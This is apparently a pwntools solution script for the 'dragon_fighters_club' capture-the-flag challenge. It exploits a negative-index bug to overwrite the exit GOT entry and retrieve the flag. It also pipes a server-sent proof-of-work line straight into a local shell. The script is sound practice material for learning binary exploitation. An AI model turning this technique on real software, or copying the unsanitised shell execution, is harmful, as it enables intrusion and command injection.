#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from subprocess import check_output as system

exe = context.binary = ELF(args.EXE or 'build/dragon_fighters_club', checksec=False)

host = args.HOST or 'dragonfightersclub.challs.olicyber.it'
port = int(args.PORT or 38303)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())


def solve_pow():
    prompt = io.recvlines(4)[-1]
    out = system(prompt, shell=True)
    io.sendlineafter(b': ', out)
    

def exploit_overflow():
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'> ', b'-5')
    io.sendlineafter(b'?\n', str(0x4010b0 - 0x4012c1).encode())
    io.sendlineafter(b'> ', b'7')


def get_life():
    io.sendlineafter(b'> ', b'1')
    return int(io.recvline().decode().split(': ')[-1][2:].strip(), 16)
    

def dragon_lifes() -> list[int]:
    io.sendlineafter(b'> ', b'2')
    dragons = io.recvlines(10)
    return [int(dragon.decode().split(": ")[-1][2:].strip(), 16) for dragon in dragons]


def fight(dragon: int, damage: int) -> bool:
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'> ', str(dragon).encode())
    status = io.recvline()
    
    if status.startswith(b'Pls!'):
        return False
    
    io.sendlineafter(b'?\n', str(damage).encode())
    
    return True


def earn_life(target: int):
    while (life := get_life()) <= target:
        dls = dragon_lifes()
        dr = 0
        
        for dl in range(len(dls)):
            if dls[dl] >= life:
                dr = dl-1
                break

        fight(dr, 0)

    
# -- Exploit goes here --

# exit@got.plt = 0x4010b0
io = start()

if not args.LOCAL:
    log.info('Solving POW...')
    solve_pow()
    log.success('Done!')


log.info("Farming hp...")
earn_life(0x4010b0)
log.info(f"HP: {hex(get_life())}")
log.info("Exploiting...")
exploit_overflow()
log.info(f"Flag: {io.recvlines(2)[-1].decode()}")
log.success("Done")

io.close()
